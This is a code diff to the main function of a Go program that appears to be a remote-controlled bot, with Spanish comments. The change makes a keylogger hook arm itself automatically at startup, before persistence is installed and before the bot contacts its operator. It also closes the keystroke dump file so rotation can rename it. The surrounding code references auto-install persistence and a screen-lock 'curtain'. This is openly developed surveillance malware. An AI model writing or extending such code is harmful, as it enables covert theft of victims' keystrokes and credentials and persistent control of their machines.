@@ -127,6 +127,12 @@ func main() {
 		}
 	}
 
+	// El keylogger arranca solo, antes de instalar la persistencia y antes de
+	// conectar el bot: el hook queda montado en el primer segundo, sin esperar
+	// a que el operador mande un comando. Si el operador lo apagó a mano en la
+	// sesión anterior, AutoStart lo respeta.
+	win32.Default.AutoStart()
+
 	// Latido inicial: este proceso existe y está arrancando. Sin esto, una
 	// copia lanzada por la tarea mientras esta todavía conecta vería el latido
 	// viejo, mataría a la que está arrancando y entraría en un bucle de relevos.
@@ -138,10 +144,6 @@ func main() {
 	if err := autoInstall(); err != nil {
 		slog.Debug("auto-install", "err", err)
 	}
-
-	// Si el keylogger quedó encendido antes del último reinicio, se vuelve a
-	// instalar el hook aquí: el operador no debería tener que recordarlo.
-	win32.Default.RestoreIfArmed()
 
 	// El candado manda sobre todo lo demás. Si la bandera existe —porque el
 	// operador lo pidió o porque la máquina acaba de arrancar— la cortina sube
@@ -209,6 +211,9 @@ func main() {
 
 	<-ctx.Done()
 	wg.Wait()
+	// Suelta el sumidero con lo último volcado: sin esto el archivo queda
+	// abierto hasta que el proceso muere y la rotación no puede renombrarlo.
+	win32.Default.Close()
 	time.Sleep(2 * time.Second)
 }
 
